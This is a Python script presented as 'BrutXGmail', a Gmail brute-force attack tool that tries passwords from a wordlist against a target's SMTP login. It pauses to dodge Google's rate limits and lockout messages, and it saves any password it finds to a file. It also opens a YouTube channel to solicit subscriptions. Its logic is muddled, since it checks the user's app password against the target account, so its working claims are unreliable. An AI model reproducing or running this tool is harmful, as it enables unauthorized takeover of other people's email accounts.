#!/usr/bin/env python3
import os
import sys
import time
import smtplib
import socket

os.system("clear")

def animate(text):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.008)

def create_smtp_connection():
    """إنشاء اتصال SMTP جديد بخوادم Gmail"""
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.ehlo()
    server.starttls()
    return server

def StartBruteAccount(wordlist_path, target_email, app_password, sleep_time):
    """
    target_email: البريد المستهدف (الذي نريد إيجاد كلمة المرور له)
    app_password: كلمة مرور التطبيق لحساب Gmail (يجب تفعيلها من إعدادات Google)
    """
    # قراءة قائمة كلمات المرور
    try:
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"\033[1;31m[-] Wordlist file '{wordlist_path}' not found.\033[0m")
        sys.exit(1)
    
    total = len(passwords)
    print(f"\n[+] Loaded {total} passwords.\n")
    
    # التحقق من صحة App Password قبل البدء
    try:
        test_server = create_smtp_connection()
        test_server.login(target_email, app_password)
        test_server.quit()
        print(f"\033[1;32m[+] App Password is valid. Starting brute force on {target_email}...\033[0m\n")
    except Exception as e:
        print(f"\033[1;31m[-] Invalid App Password or account issue: {e}\033[0m")
        print("\033[1;33m[!] Make sure you have generated an App Password from Google Account > Security > App Passwords\033[0m")
        sys.exit(1)
    
    fail_count = 0
    idx = 0
    
    while idx < total:
        password = passwords[idx]
        
        try:
            # إنشاء اتصال جديد لكل محاولة (أفضل لتجنب تراكم المشاكل)
            server = create_smtp_connection()
            server.login(target_email, password)
            
            # إذا وصلنا هنا، النجاح
            print(f"\n\033[1;32m[+] ✓✓ VALID PASSWORD FOUND: {password} ✓✓\033[0m")
            print(f"\033[1;32m[+] Account: {target_email}\033[0m")
            
            with open('credits.txt', 'a') as f:
                f.write(f"\n[+] Target: {target_email}\n[+] Password: {password}\n{'-'*40}\n")
            server.quit()
            return True
            
        except smtplib.SMTPAuthenticationError:
            # كلمة مرور خاطئة
            print(f"\033[1;31m[-] Bad Password: {password}\033[0m")
            fail_count += 1
            idx += 1
            
            # كل 5 محاولات فاشلة، ننام لتجنب الحظر
            if fail_count % 5 == 0:
                print(f"\n\033[1;33m[!] Sleeping for {sleep_time} seconds (rate limiting protection)...\033[0m")
                time.sleep(sleep_time)
                print("\033[1;32m[+] Resuming...\033[0m\n")
            
        except (smtplib.SMTPServerDisconnected, socket.error, ConnectionResetError, BrokenPipeError, OSError) as conn_err:
            print(f"\n\033[1;33m[!] Connection lost, retrying the same password in 10 seconds...\033[0m")
            time.sleep(10)
            # لا نزيد idx، نعيد محاولة نفس الكلمة
            continue
            
        except Exception as e:
            error_msg = str(e).lower()
            if "please log in via your web browser" in error_msg:
                print("\n\033[1;31m[!] Google requires browser login. Please log into your Gmail account via web.\033[0m")
                sys.exit(1)
            elif "too many login attempts" in error_msg:
                print(f"\n\033[1;33m[!] Too many attempts. Sleeping for {sleep_time*2} seconds...\033[0m")
                time.sleep(sleep_time * 2)
                continue
            else:
                print(f"\n\033[1;33m[!] Unexpected error: {e}. Retrying...\033[0m")
                time.sleep(5)
                continue
    
    print("\n\033[1;31m[-] Brute force completed. No valid password found.\033[0m")
    return False

# ====================== واجهة البرنامج والعرض ======================
banner = '''\033[1;32m
                           ██╗  ██╗ ██████╗ ██████╗
                           ██║  ██║██╔════╝██╔═══██╗
                           ███████║██║     ██║   ██║
                           ██╔══██║██║     ██║   ██║
                           ██║  ██║╚██████╗╚██████╔╝
                           ╚═╝  ╚═╝ ╚═════╝ ╚═════╝
\033[1;33m
                   ██████╗ ██████╗ ██╗   ██╗████████╗██╗  ██╗
                   ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝╚██╗██╔╝
                   ██████╔╝██████╔╝██║   ██║   ██║    ╚███╔╝ 
                   ██╔══██╗██╔══██╗██║   ██║   ██║    ██╔██╗ 
                   ██████╔╝██║  ██║╚██████╔╝   ██║   ██╔╝ ██╗
                   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝
\033[1;31m                     :: BrutXGmail - By Hackers Colony ::
\033[0m'''
animate(banner)

notice = ("\n\033[1;34mThis Tool is Free For Our Subscribers.\n"
         "We are Redirecting You To Our YouTube Channel.\n"
         "Subscribe to our channel to use the tool.\033[0m\n")
animate(notice)
time.sleep(5)
os.system("xdg-open https://youtube.com/@hackers_colony_tech?si=7FEalwT2t0khmivd")
time.sleep(7)
os.system("clear")

logo = '''\033[1;32m
                 /$$$$$$$                        /$$     /$$   /$$
                | $$__  $$                      | $$    | $$  / $$
                | $$  \ $$  /$$$$$$  /$$   /$$ /$$$$$$  |  $$/ $$/
                | $$$$$$$  /$$__  $$| $$  | $$|_  $$_/   \  $$$$/ 
                | $$__  $$| $$  \__/| $$  | $$  | $$      >$$  $$ 
                | $$  \ $$| $$      | $$  | $$  | $$ /$$ /$$/\  $$
                | $$$$$$$/| $$      |  $$$$$$/  |  $$$$/| $$  \ $$
                |_______/ |__/       \______/    \___/  |__/  |__/                                                       
                    /$$$$$$                          /$$ /$$
                   /$$__  $$                        |__/| $$
                  | $$  \__/ /$$$$$$/$$$$   /$$$$$$  /$$| $$
                  | $$ /$$$$| $$_  $$_  $$ |____  $$| $$| $$
                  | $$|_  $$| $$ \ $$ \ $$  /$$$$$$$| $$| $$
                  | $$  \ $$| $$ | $$ | $$ /$$__  $$| $$| $$
                  |  $$$$$$/| $$ | $$ | $$|  $$$$$$$| $$| $$
                   \______/ |__/ |__/ |__/ \_______/|__/|__/
            \033[1;34m     .:H a c k e r  C o l o n y  O f f i c i a l:.
                       __Gmail BruteForce Attack Tool__
\033[0m'''
animate(logo)

print("\n\033[1;33m╔════════════════════════════════════════════════════════════╗\033[0m")
print("\033[1;33m║  IMPORTANT: Gmail requires an APP PASSWORD for SMTP login  ║\033[0m")
print("\033[1;33m║  Generate one at: Google Account → Security → App Passwords ║\033[0m")
print("\033[1;33m╚════════════════════════════════════════════════════════════╝\033[0m\n")

try:
    target = input("\033[1;36m[?] Enter target Gmail address: \033[0m").strip()
    if not target or "@gmail.com" not in target:
        print("\033[1;31m[-] Invalid Gmail address.\033[0m")
        sys.exit(1)
    
    app_pass = input("\033[1;36m[?] Enter your App Password (for SMTP authentication): \033[0m").strip()
    if not app_pass:
        print("\033[1;31m[-] App Password is required.\033[0m")
        sys.exit(1)
    
    print("\n\033[1;36m[?] Choose wordlist:\033[0m")
    print("   \033[1;31m1\033[0m. Your custom wordlist")
    print("   \033[1;31m2\033[0m. HCO Wordlist (hcowordlist.txt)")
    choice = input("\n\033[1;36m> \033[0m")
    
    if choice == "1":
        wordlist = input("\033[1;36m[?] Path to wordlist: \033[0m").strip()
    elif choice == "2":
        wordlist = "hcowordlist.txt"
        print(f"\n\033[1;33m[!] Using '{wordlist}'. Make sure the file exists.\033[0m")
    else:
        print("\033[1;31m[-] Invalid choice.\033[0m")
        sys.exit(1)
    
    print("\n\033[1;34m[*] Starting brute force attack...\033[0m")
    print("\033[1;34m[*] This may take a long time due to Google's rate limiting.\033[0m\n")
    
    StartBruteAccount(wordlist, target, app_pass, sleep_time=60)

except KeyboardInterrupt:
    print("\n\n\033[1;31m[!] Interrupted by user. Exiting...\033[0m")
except Exception as e:
    print(f"\n\033[1;31m[!] Error: {e}\033[0m")